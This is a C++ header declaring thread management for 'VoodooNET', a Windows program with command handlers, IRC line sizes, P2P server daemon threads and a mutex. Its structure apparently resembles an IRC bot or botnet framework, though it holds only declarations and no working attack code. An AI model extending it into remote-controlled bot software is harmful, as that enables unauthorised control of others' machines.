/*
 *  VoodooNET - a modular multi-threaded program for Windows x86/x64 bit
 *	Coded by VoRTeCKZ - @therealvorteckz
 *  VoRTeCKZ Studios
 *
 *	Copyright (C) 2023 - All Rights Reserved.
 *
 * Permission to ("use, copy, and/or modify") this software for
 * any purpose  with or without fee is hereby granted, provided that the above copyright
 * notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
 * INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR
 * PURPOSE AND NONINFRINGEMENT OF THIRD PARTY RIGHTS. IN NO EVENT SHALL THE AUTHORS OR
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
 * ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 *
 */

#ifndef __CTHREAD_H__
#define __CTHREAD_H__
#define IRCLINE 200
#define MAX_THREADS 250
using namespace std;


class cThread : public cCommandHandler
{
public:
	cThread();
	void Init();

	bool cModuleHandler(char* name, char* desc, ...);
	bool	HandleCommand(char* cmd, char* params, ...);
	int AddThread(int id, char* name, ...);
	BOOL KillThread(int threadnum);
	BOOL KillThreadP2P();
	int KillAllThreads(void);
	void ClearThread(int threadnum);
	void ClearAllThreads();
	command		m_cmdListThread;
	command		m_cmdKillThread;
	command		m_cmdKillAllThreads;

	moduload	m_cThreadModule;
	int checkifperm(int threadnum);
	bool Mutex(const char* threadname);
//	int BuildThread()
	
};
enum {
	MAIN_THREAD,
	TESTONE_THREAD,
	MAGIC_THREAD,
	SERVERDAEMON_THREAD,
	RESETSERVERDAEMON_THREAD,
	PING_THREAD,
	LIST_THREAD,
	ASTRO_THREAD,
	ENDP2PSERVER_THREAD,
	RESETP2PSERVER_THREAD,
};

typedef struct THREAD
{
	char name[IRCLINE  - 1];
	int id;
	int parent;
	DWORD pid;
	HANDLE tHandle;
	BOOL PFLAG; //TRUE = PERMANENT THREAD


} THREAD;
// default new thread structure
typedef struct NTHREAD {
	void* conn;
	char target[MAX_THREADS];
	int  threadnum;

	char* data1;
	char* data2;
	char* data3;

	BOOL bdata1;
	BOOL bdata2;
	BOOL bdata3;

	int idata1;
	int idata2;


} NTHREAD;

DWORD WINAPI ListThread(LPVOID param);

#endif
